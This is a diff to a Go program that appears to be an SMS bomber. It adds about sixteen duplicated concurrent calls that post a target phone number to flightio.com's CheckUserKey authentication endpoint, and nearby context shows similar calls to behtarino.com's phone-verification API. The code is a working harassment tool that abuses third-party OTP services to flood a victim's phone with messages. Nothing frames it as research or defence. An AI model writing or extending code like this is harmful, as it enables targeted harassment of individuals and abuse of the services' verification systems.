@@ -110,6 +110,54 @@ func main() {
 
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch)
+ 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch)
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
+		}, ch) 
+
+
+		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone,
 		}, ch)   // just check
 		go sms("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
 			"phone": phone,
